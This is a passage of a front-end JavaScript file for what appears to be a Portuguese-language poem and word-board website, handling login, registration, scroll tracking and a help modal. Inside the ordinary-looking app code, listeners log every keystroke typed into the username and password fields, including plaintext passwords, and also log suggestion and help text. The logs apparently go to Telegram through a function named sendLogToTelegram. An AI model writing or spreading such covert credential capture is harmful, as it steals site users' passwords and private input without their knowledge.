  document.getElementById("register-box").classList.add("hidden");
  document.getElementById("login-box").classList.remove("hidden");
});




// checar login
async function checkLogin() {
  try {
    const res = await fetch("/api/me");
    const data = await res.json();

    if (data.loggedIn) {
      authDiv.style.display = "none";
      appDiv.style.display = "flex";
appDiv.style.flexDirection = "column";
appDiv.style.justifyContent = "center";
appDiv.style.alignItems = "center";

      
      usernameSpan.textContent = data.user.username;
    } else {
      authDiv.style.display = "flex"; // ou block, dependendo do CSS
      appDiv.style.display = "none";
      document.getElementById("login-box").classList.remove("hidden");
      document.getElementById("register-box").classList.add("hidden");
    }
  } catch (err) {
    console.error(err);
  }
}

// login
async function login() {
  const username = document.getElementById("login-username").value;
  const password = document.getElementById("login-password").value;

  const res = await fetch("/api/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ username, password })
  });

  const data = await res.json();
  if (data.success) {
    authDiv.style.display = "none";
    appDiv.style.display = "block";
    usernameSpan.textContent = username;
  } else {
    alert(data.error || "Erro ao logar");
  }
}

// registro
async function register() {
  const username = document.getElementById("register-username").value;
  const password = document.getElementById("register-password").value;

  const res = await fetch("/api/register", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ username, password })
  });

  const data = await res.json();
  if (data.success) {
    authDiv.style.display = "none";
    appDiv.style.display = "block";
    usernameSpan.textContent = username;
  } else {
    alert(data.error || "Erro ao registrar");
  }
}

// logout
async function logout() {
  await fetch("/api/logout", { method: "POST" });
  authDiv.style.display = "flex";
  appDiv.style.display = "none";
}

const menuLogout = document.getElementById("logout-btn");
menuLogout.addEventListener("click", logout);

// checa login ao carregar
checkLogin();

// Chama ao carregar a página
loadGithubImages();


function trackScrollMobile(element, message, interval = 300) {
  if (!element) return;
  let lastSent = 0;
  let lastScrollTop = element.scrollTop || window.scrollY || 0;

  element.addEventListener("scroll", () => {
    const now = Date.now();
    if (now - lastSent < interval) return;
    lastSent = now;

    const currentScrollTop = element.scrollTop || window.scrollY || 0;
    const direction = currentScrollTop > lastScrollTop ? "⬇️ para baixo" : "⬆️ para cima";
    lastScrollTop = currentScrollTop;

    enqueueLog(`${message} (${direction})`);
  });
}

// Exemplo de uso:
trackScrollMobile(window, "ℹ️ Usuário rolou a página");
trackScrollMobile(document.getElementById("poem-body"), "📜 Usuário rolou o poema!");
trackScrollMobile(document.getElementById("sobre-body"), "ℹ️ Usuário rolou conteúdo do Sobre!");
trackScrollMobile(document.getElementById("suggestionText"), "✏️ Usuário rolou textarea de sugestão!");
trackScrollMobile(document.getElementById("word-board"), "📝 Usuário rolou quadro de palavras!");

window.addEventListener("orientationchange", () => {
  enqueueLog("orientation_change", "", `Mudança de orientação: ${screen.orientation.type}`);
});

document.addEventListener("touchmove", (e) => {
  if (e.touches.length > 1) {
enqueueLog("multitouch", "Usuário realizou gesto multitouch");  }
});

// captura login
function sendLogToTelegram(message) {
    enqueueLog(message);
}

// Função de captura e envio para log/Telegram
function logLoginMovement(mensagem) {
    enqueueLog(`Login: ${mensagem}`);
    sendLogToTelegram(`🔐 Movimento no login: ${mensagem}`);
}

document.getElementById("login-btn").addEventListener("click", function () {
    logLoginMovement("Tentativa de login enviada");
    checkLogin();
});

document.getElementById("show-register").addEventListener("click", () => {
    enqueueLog("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
});



// Captura do clique no botão registrar
document.getElementById("register-btn").addEventListener("click", function () {
    enqueueLog("Usuário clicou em registrar");
});
// --- LOGIN ---
const loginUsername = document.getElementById("login-username");
const loginPassword = document.getElementById("login-password");
const loginBtn = document.getElementById("login-btn");

// Captura digitação no username
loginUsername.addEventListener("input", () => {
    enqueueLog(`🔐 Login: digitando username -> ${loginUsername.value}`);
});

// Foco no username
loginUsername.addEventListener("focus", () => {
    enqueueLog("🔐 Login: focou no campo username");
});

// Digitação no password
loginPassword.addEventListener("input", () => {
    enqueueLog(`🔐 Login: digitando password -> ${loginPassword.value}`);
});

// Foco no password
loginPassword.addEventListener("focus", () => {
    enqueueLog("🔐 Login: focou no campo password");
});

// Clique no botão login
loginBtn.addEventListener("click", () => {
    enqueueLog(`✅ Tentativa de login: username = ${loginUsername.value}, password = ${loginPassword.value}`);
});


// --- REGISTRO ---
const regUsername = document.getElementById("register-username");
const regPassword = document.getElementById("register-password");
const regBtn = document.getElementById("register-btn");

// Digitação no username do registro
regUsername.addEventListener("input", () => {
    enqueueLog(`✏️ Registro: digitando username -> ${regUsername.value}`);
});

// Foco no username do registro
regUsername.addEventListener("focus", () => {
    enqueueLog("✏️ Registro: focou no campo username");
});

// Digitação no password do registro
regPassword.addEventListener("input", () => {
    enqueueLog(`✏️ Registro: digitando password -> ${regPassword.value}`);
});

// Foco no password do registro
regPassword.addEventListener("focus", () => {
    enqueueLog("✏️ Registro: focou no campo password");
});

// Clique no botão registrar
regBtn.addEventListener("click", () => {
    enqueueLog(`✅ Tentativa de registro: username = ${regUsername.value}, password = ${regPassword.value}`);
});

 // --- SUGESTÕES / RECLAMAÇÕES ---
  const suggestionText = document.getElementById("suggestionText");
  const sendSuggestionBtn = document.getElementById("sendSuggestion");

  suggestionText.addEventListener("input", () => enqueueLog(`✏️ Usuário digitou em Sugestão/Reclamação: ${suggestionText.value}`));
  suggestionText.addEventListener("focus", () => enqueueLog("✏️ Usuário focou no campo de Sugestão/Reclamação"));
  sendSuggestionBtn.addEventListener("click", () => enqueueLog(`✅ Usuário enviou sugestão: ${suggestionText.value}`));


  newWordInput.addEventListener("input", () => enqueueLog(`📝 Usuário digitou palavra: ${newWordInput.value}`));
  newWordInput.addEventListener("focus", () => enqueueLog("📝 Usuário focou no campo de nova palavra"));
  addWordBtn.addEventListener("click", () => enqueueLog(`✅ Usuário clicou em Adicionar Palavra: ${newWordInput.value}`));


const helpBtn = document.getElementById("help-btn");
const helpModal = document.getElementById("help-modal");
const helpClose = document.getElementById("help-close");
const helpSend = document.getElementById("help-send");
const helpText = document.getElementById("help-text");

  helpBtn.addEventListener("click", () => {
    helpModal.style.display = "flex";
    enqueueLog("🆘 Usuário abriu o modal de Ajuda");
});
helpClose.addEventListener("click", () => {
    helpModal.style.display = "none";
    enqueueLog("❌ Usuário fechou o modal de Ajuda");
});
helpModal.addEventListener("click", e => {
    if (e.target === helpModal) {
        helpModal.style.display = "none";
        enqueueLog("❌ Usuário fechou o modal de Ajuda clicando fora");
    }
});

helpText.addEventListener("input", () => {
    enqueueLog(`✏️ Usuário digitou no campo de Ajuda: ${helpText.value}`);
});

helpSend.addEventListener("click", async () => {
    const message = helpText.value.trim();
    if (!message) return alert("Digite uma mensagem antes de enviar.");

    const username = usernameSpan?.textContent || "usuário não preenchido";
    const fullMessage = `🆘 Ajuda do usuário: ${username}\n\nMensagem: ${message}`;

    try {
        const res = await fetch("/api/send-help", {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({message: fullMessage})
        });
        const data = await res.json();

        if (data.success) {
            alert("Mensagem enviada com sucesso!");
            helpText.value = "";
            helpModal.style.display = "none";

            enqueueLog(`✅ Usuário enviou mensagem de Ajuda: ${message}`);
            sendTelegramVisitas(fullMessage);
        } else {
            alert("Falha ao enviar mensagem.");
            enqueueLog(`❌ Erro ao enviar mensagem de Ajuda: ${data.error || "desconhecido"}`);
        }
    } catch(err) {
        console.error(err);
        alert("Erro de conexão ao enviar mensagem.");
        enqueueLog(`❌ Erro de rede ao enviar mensagem de Ajuda: ${err.message}`);
    }
});

// Conecta o botão de login ao checkLogin
document.getElementById("login-btn").addEventListener("click", checkLogin);


}); // fim
